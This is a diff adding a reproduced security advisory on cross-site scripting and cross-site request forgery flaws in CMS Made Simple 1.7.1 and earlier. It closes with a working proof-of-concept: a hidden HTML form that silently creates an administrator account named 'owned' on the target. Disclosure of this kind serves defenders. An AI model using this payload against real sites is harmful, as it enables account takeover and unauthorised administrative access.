@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/40483/info
+
+CMS Made Simple is prone to multiple cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied inputs. The application is also prone to a cross-site request-forgery vulnerability.
+
+An attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+The attacker can exploit the cross-site request-forgery issue by tricking a victim into following a specially crafted HTTP request designed to perform some action on the attacker's behalf using a victim's currently active session.
+
+CMS Made Simple 1.7.1 and prior are vulnerable. 
+
+<form name="csrf" 
+action="http://www.example.com:7080/config/confMgr.php"
+method="post" target="hidden">
+<input type="hidden" name="a" value="s" />
+<input type="hidden" name="m" value="admin" />
+<input type="hidden" name="p" value="security" />
+<input type="hidden" name="t" value="`ADMIN_USR_NEW" />
+<input type="hidden" name="r" value="" />
+<input type="hidden" name="file_create" value="" />
+<input type="hidden" name="name" value="owned" />
+<input type="hidden" name="pass" value="password" />
+<input type="hidden" name="pass1" value="password" />
+</form>
